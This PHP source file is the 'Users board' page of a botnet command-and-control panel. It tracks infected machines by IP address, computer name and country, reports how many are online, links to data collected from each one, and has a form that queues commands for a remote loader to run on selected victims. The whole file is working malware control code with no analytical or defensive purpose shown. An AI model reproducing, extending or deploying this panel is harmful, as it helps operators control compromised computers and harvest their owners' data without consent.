<?php
	/**
		Users list
		by DarkCoderSc
	
	*/
	
	include('inc/sessioncontrol.inc.php'); // test if user is logged
	
	/**
		Check if we want to send a new command
		This daemon will give task to remote loader
	*/
	if(isset($_POST['content']) && isset($_POST['cmd'])){
		
			$content = $_POST['content'];
			$users = explode("|", $content); // Content contain list of users
		
   		$sock = getDBSock(); // Assign a new database socket
   		
   		/**
   			Loop of insert in database
   		*/
			for($i = 0; $i < count($users); $i++){
				$cmd = mysql_real_escape_string($_POST['cmd']); // getting the command
				$user = mysql_real_escape_string($users[$i]);
				$sql = "INSERT INTO vn_tasks VALUES('$user','$cmd')";
				mysql_query($sql, $sock) or die(mysql_error()); // Execute query
			}
			
			mysql_close($sock); // Closing the target socket 
	}
	

	echo "<form action=\"index.php\" method=\"POST\" name=\"actionform\" id=\"actionform\">";
		echo "<h1 class=\"usersico\">Users board ($username)";
		
	  $sock = getDBSock(); // Assign a new database socket
		
		/**
			Detect offline users
		*/
		$ts3min = time()-(60 * 3); //time stamp last 3 min
		$request = "UPDATE vn_users SET status='0' WHERE t_on < $ts3min";
		mysql_query($request, $sock) or die(mysql_error()); // Execute query
		
		/**
			Detect dead users
		*/
		$tsndays = time()-(60 * ($GLOBALS["usersdead"] * 1440)); //time stamp last 3 min
		$request = "UPDATE vn_users SET status='2' WHERE t_on < $tsndays";
		mysql_query($request, $sock) or die(mysql_error()); // Execute query
		
		/**
			Detect count of users both
		*/
		$sql = "SELECT COUNT(*) AS nbs FROM vn_users";
		$result = mysql_query($sql, $sock) or die(mysql_error()); // Execute query
		$data = mysql_fetch_array($result);
		$totalbots = $data['nbs']; // Getting number of bots
		
		/**
			Now online users only !
		*/
		$sql = "SELECT COUNT(*) As nbo FROM vn_users WHERE status='1'";
		$return = mysql_query($sql, $sock);
		$data = mysql_fetch_array($return);
		$totalbots_on = $data['nbo']; // Getting number of bots
		
		/**
			Making statistics
		*/
		$totalbots_off = ($totalbots - $totalbots_on);
		$perc_bots_on = 0;
		$perc_bots_off = 0;
		if ($totalbots > 0) $perc_bots_on = ($totalbots_on * 100)/$totalbots;
		if ($totalbots > 0) $perc_bots_off = ($totalbots_off * 100)/$totalbots;
				
		echo "<div id=\"stats\">";
			echo "<table style=\"border-spacing: 0px;\">";
				echo "<tr>";
						echo "<td>Online bots :</td><td><span style=\"color:green;\">".number_format($totalbots_on, 0, '.', ' ')."</span> (+".number_format($perc_bots_on, 0, '.', ' ')."%)</td>";	
				echo "</tr>";
				echo "<tr>";
					echo "<td>Offline bots :</td><td><span style=\"color:red;\">".number_format($totalbots_off, 0, '.', ' ')."</span> (+".number_format($perc_bots_off, 0, '.', ' ')."%)</td>";	
				echo "</tr>";
				echo "<tr>";
					echo "<td>Total bots :</td><td>".$totalbots."</td>";	
				echo "</tr>";
			echo "</table>";
		echo "</div>";
	
		echo "</h1>";
		echo "<div class=\"divusers\" style=\"max-height:".$userswidth."px;\">";
 			echo "<table class=\"tusers\">";
	 			echo "<th><input type=\"checkbox\" id=\"maincheck\" OnChange=\"checkboxall(this);\"></input></td>";
	 			echo "<th>#</th>";
	 			echo "<th>IP (Remote Addr)</th>";
	 			echo "<th>Computer name</th>";
	 			echo "<th>Country</th>";
	 			echo "<th>idle</th>";
	 			echo "<th style=\"width:45px;\">Version</th>";
	 			echo "<th style=\"text-align:center; width:23px;\">T</th>";
	 			echo "<th style=\"text-align:center; width:23px;\">S</th>";
   		
				/**
					For merging query if we want offline bots too
				*/
				$addquery = "";
				if($GLOBALS['showofflines'] == "0"){
					$addquery .= "WHERE status = 1";
				}else{
					$addquery .= "WHERE status = 0 or status = 1";
				}
				
				/**
					If we wana see dead users too :)
				*/
				if($GLOBALS['showdead'] == "1"){
					$addquery .= " or status = 2";
				}
				
				/**
					For pages
				*/
				$sql = "SELECT COUNT(*) AS nbmsg FROM vn_users $addquery";
				$return = mysql_query($sql);
				$data = mysql_fetch_array($return);
				$totalMsg = $data['nbmsg'];
				$nbp = ceil($totalMsg / $usersperpage);
				
				/**
					Get pages to display
				*/
				if (isset($_GET['p'])){
					$p = htmlspecialchars($_GET['p']); 
				}else{
					$p = 1;
				}
				$firstMsg = ($p - 1) * $usersperpage;
							
				/*Iterate for users in database vn_users*/
				$sql = "SELECT * FROM vn_users ".$addquery." LIMIT $firstMsg, $usersperpage";
				$result = mysql_query($sql, $sock) or die(mysql_error()) ;
				$i = false; // For changing colours
				$num = 0;

				/**
					Iterating on database for getting users
				*/
				while($data = mysql_fetch_array($result)) {
					
					$num++; //counter
					
					/**
						Getting bot status (Online or Offline)
					*/
					if ($data['status'] == 0){
						$status = "<img src=\"imgs/reddot.png\"></img>"; 
					}elseif($data['status'] == 1){
						$status = "<img src=\"imgs/greendot.png\"></img>";
					}else{
						$status = "<img src=\"imgs/graydot.png\"></img>";
					}
					
					//For semi coloration using the modulo
					if($num % 2 == 1){
						$color = "#232323";	
					}else{
						$color = "#303030";
					}
				 
					/**
						To get country flag of user
						TODO : use local geo base
					*/
					$cflag = $data['CC'];
					if($usegeoip == 1){
					 $cflag = file_get_contents("http://api.hostip.info/country.php?ip=".$data['ip']."",0);
					 if(trim($cflag) == "" || strtoupper(trim($cflag)) == "XX"){
					 		$cflag = $data['CC'];
					 }
					}
					
					/**
						Forming data image.
						if the image is in color then there is some new items
					*/
					if ($data['nfdata'] == 1)
						$dataimg = "data.png";
					else 
						$dataimg = "data_g.png";
				
					echo "<tr>";
						echo "<td style=\"width:20px; background-color:".$color."\"><input OnChange=\"document.getElementById('maincheck').checked = false; return true;\" type=\"checkbox\" name=\"check".$num."\" id=\"check".$num."\" ></input></td>";
						echo "<td style=\"background-color:".$color."\"><img src=\"imgs/flags/".strtolower($cflag).".png\"></img>&nbsp;".$num."</td>";
						echo "<td style=\"background-color:".$color."\"><b>".$data['ip']."</b>/".$data['lan']."</td>";	
						echo "<td style=\"background-color:".$color."\">".$data['cmpname']."</td>";
						echo "<td style=\"background-color:".$color."\">".$data['country']."</td>";	
						echo "<td style=\"background-color:".$color."\">".$data['idle']."s</td>";
						echo "<td style=\"width:45px; background-color:".$color."\">".$data['version']."</td>";
						echo "<td style=\"text-align:center; background-color:".$color."\"><a href=\"index.php?page=datalist&amp;uid=".$data['uid']."\"><img src=\"imgs/".$dataimg."\"></a></img></td>";							
						echo "<td style=\"text-align:center; width:23px; background-color:".$color."\">".$status."</td>";	
					echo "</tr>";
				
					echo "<input type=\"hidden\" name=\"uid".$num."\" id=\"uid".$num."\" value=\"".$data['uid']."\"></input>";		
				}
		
			/**
				For page counting
			*/
			echo "</table>";
			echo "<div id=\"upage\">";
				echo '<b>Page</b> : ';
		
				for ($i=1 ; $i<=$nbp ; $i++) {
					if($i != $nbp) $virg = ", "; else $virg = "";
				  echo '<a href="index.php?page=users&amp;p='.$i.'">'.$i.'</a> '.$virg;
				}
			echo "</div>";
		echo "</div>";

		echo "<input type=\"hidden\" name=\"numid\" id=\"numid\" value=\"".$num."\"></input>";
		echo "<input type=\"hidden\" name=\"content\" id=\"content\" value=\"\"></input>";
	
		/**
			For sending commands
		*/
		echo "<table class=\"tcmd\">";
			echo "<tr>";
				echo "<td><label class=\"promptico\">Command :</label></td>";
				echo "<td>";
						echo "<select onChange=\"processChange(this); return true;\">";

							/**
								Query to get all commands
							*/
							$sql = "SELECT displayname FROM vn_cmds";
							$result = mysql_query($sql, $sock) or die(mysql_error()) ;
							
							/**
								Get all options command
							*/
							while($data = mysql_fetch_array($result)) {
								$dispName = htmlspecialchars($data['displayname']);
								$dispArray = explode("|", $dispName);
								echo "<option value=\"$dispArray[1]\" >$dispArray[0]</option>";
							}
							mysql_close($sock); // Close mysql connection for this page
	
						echo "</select>";
				echo "</td>";
				
				echo "<td id=\"bubble1\" name=\"bubblechanger\" class=\"bubble\"><input type=\"text\" id=\"cmd\" name=\"cmd\" size=\"25\" onkeypress=\"if (event.keyCode == 13) processSubmit();\" value=\"msg::\"></input></td>";
				echo "<td><input type=\"button\" value=\"Send Command\" OnClick=\"processSubmit();\"></input></td>";
			echo "</tr>";
		echo "</table>";
	echo "</form>";
?>